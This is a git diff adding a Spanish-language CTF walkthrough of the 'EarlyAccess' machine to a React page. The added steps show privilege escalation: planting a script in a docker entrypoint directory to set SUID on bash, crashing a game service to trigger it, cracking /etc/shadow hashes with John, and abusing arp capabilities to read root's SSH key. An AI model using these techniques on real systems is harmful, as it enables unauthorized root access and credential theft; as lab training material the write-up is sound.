@@ -1082,8 +1082,111 @@ export function EarlyAccess() {
         height={222}
       />
       <Paragraph>
-        ahora
+        ahora en <i>/</i> tenemos un archivo llamado <i>entrypoint.sh</i>
       </Paragraph>
+      <Highlighter
+        text={`
+          game-tester@game-server:/$ cat entrypoint.sh
+          #!/bin/bash
+          for ep in /docker-entrypoint.d/*; do
+            if [ -x "$(ep)" ]; then
+              echo "Running: \${ep}"
+              "\${ep}" &
+            fi
+          done
+          tail -f /dev/null
+        `}
+      />
+      <Paragraph>
+        vemos que en <i>/docker-entrypoint.d</i> tenemos un archivo <i>node-server.sh</i>...
+      </Paragraph>
+      <Highlighter
+        text={`
+          game-tester@game-server:/$ cat node-server.sh
+          service ssh start
+
+          cd /usr/src/app
+
+          # Install dependencies
+          npm install
+          sudo -u node node server.js
+        `}
+      />
+      <Paragraph>
+        coje cada archivo dentro de <i>/docker-entrypoint.d</i> y lo ejecuta, pero el <i>node-server.sh</i> lo tendra que traerlo de alguna ruta para ello 
+        ejecutamos...
+      </Paragraph>
+      <Highlighter
+        text={`
+           find \\-name node-server.sh 2>/dev/null
+           ./opt/docker-entrypoint.d/node-server.sh
+        `}
+      />
+      <Paragraph>
+      es esta la ruta donde tendremos que crear nuestro script para ganar acceso :D.. y 
+      tratar de petar el juego como por ejemplo <i>curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'</i>
+      </Paragraph>
+      <Highlighter
+        text={`
+          drew@earlyaccess:/$ while true; do echo "chmod u+s /bin/bash" > /opt/docker-entrypoint/miscript.sh; chmod +x /opt/docker-entrypoint/miscript.sh;sleep 1; done
+        `}
+      />
+       <Paragraph>
+        y del otro lado... y esperamos ....
+      </Paragraph>
+      <Highlighter
+        text={`
+          game-tester@game-server:/$ curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'
+          Connection to 172.19.0.3 closed by remote host.
+          Connection to 172.19.0.3 closed.
+          drew@earlyaccess:~/.shh
+        `}
+      />
+      <Paragraph>
+        una vez que nos bota el host nos conectamos de nuevo <i>ssh game-tester@172.19.0.3</i> y listooo...
+      </Paragraph>
+      <Highlighter
+        text={`
+          -bash-4.4$ cd /docker-entrypoint.d/
+          -bash-4.4$ ls
+          miscript.sh node-server.sh
+          -bash-4.4$ bash -p
+          bash-4.4# whoami
+          root
+          bash-4.4#
+        `}
+      />
+      <Paragraph>
+        no vemos ninguna flag en la raiz pero podemos ver el <i>/etc/shadow</i> y existe un mismo usuario <i>game-adm</i> 
+        la trataremos de romper con nuestro querido <i>jhon</i>.
+      </Paragraph>
+      <Highlighter
+        text={`
+          jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
+          ...
+          gamemaster (game-adm)
+          ...
+        `}
+      />
+      <Paragraph>
+        genial nos dio una contraseña nos conectamos <i>drew@earlyaccess:/home$ su game-adm</i>
+        este usuario pertenece al grupo <i>4(adm)</i> recordemos que teniamos <i>arp</i> con las 
+        capacidades de <i>=ep</i> la cual nos permite leer archivos como indica <a src='https://gtfobins.github.io/gtfobins/arp/#file-read' noreferer={true}>gtfobins</a>,
+        entonces procedemos de la siguiente manera... 
+      </Paragraph>
+      <Highlighter
+        text={`
+          game-adm@earlyaccess:/home$ LFILE=/root/.ssh/id_rsa
+          game-adm@earlyaccess:/home$ /usr/sbin/arp -v -f $LFILE 2>&1 | grep -Ev "format|cannot|Unknown host" | sed 's/>> //' >/tmp/id_rsa
+          game-adm@earlyaccess:/home$ chmod 600 /tmp/id_rsa
+          game-adm@earlyaccess:/tmp$ ssh -i id_rsa root@localhost
+          root@earlyaccess:~# cd /root
+          root@earlyaccess:~# ls
+          app root.txt
+          root@earlyaccess:~# cat root.txt
+          ******************
+        `}
+      />
     </ContentBlock>
   </>
 }
